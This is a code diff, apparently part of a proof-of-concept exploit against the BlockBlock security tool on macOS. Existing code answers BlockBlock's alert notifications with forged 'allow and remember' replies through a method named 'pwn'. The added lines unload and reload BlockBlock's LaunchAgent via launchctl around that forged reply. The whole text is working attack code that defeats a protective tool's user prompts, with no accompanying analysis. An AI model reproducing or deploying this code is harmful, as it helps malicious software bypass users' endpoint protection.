@@ -30,7 +30,11 @@
 	
 	if ([notification.name isEqualToString:@"shouldDisplayAlertNotification"])
 	{
+		[self unload];
+		
 		[self pwn:[notification userInfo]];
+		
+		[self load];
 	}
 
 	NSLog(@"%@", notification);
@@ -43,6 +47,30 @@
 	NSDictionary *pwnInfo = @{ @"action": @(1), @"remember": @(1), @"watchEventUUID": userInfo[@"watchEventUUID"] };
 	
 	[center postNotificationName:@"shouldHandleAlertNotification" object:nil userInfo:pwnInfo options:NSNotificationDeliverImmediately|NSNotificationPostToAllSessions];
+}
+
+- (void)unload
+{
+	NSTask *task = [[NSTask alloc] init];
+	
+	task.launchPath = @"/bin/launchctl";
+	task.arguments = @[ @"unload", @"Library/LaunchAgents/com.objectiveSee.blockblock.plist" ];
+	task.currentDirectoryPath = NSHomeDirectory();
+	
+	[task launch];
+	[task waitUntilExit];
+}
+
+- (void)load
+{
+	NSTask *task = [[NSTask alloc] init];
+	
+	task.launchPath = @"/bin/launchctl";
+	task.arguments = @[ @"load", @"Library/LaunchAgents/com.objectiveSee.blockblock.plist" ];
+	task.currentDirectoryPath = NSHomeDirectory();
+	
+	[task launch];
+	[task waitUntilExit];
 }
 
 @end
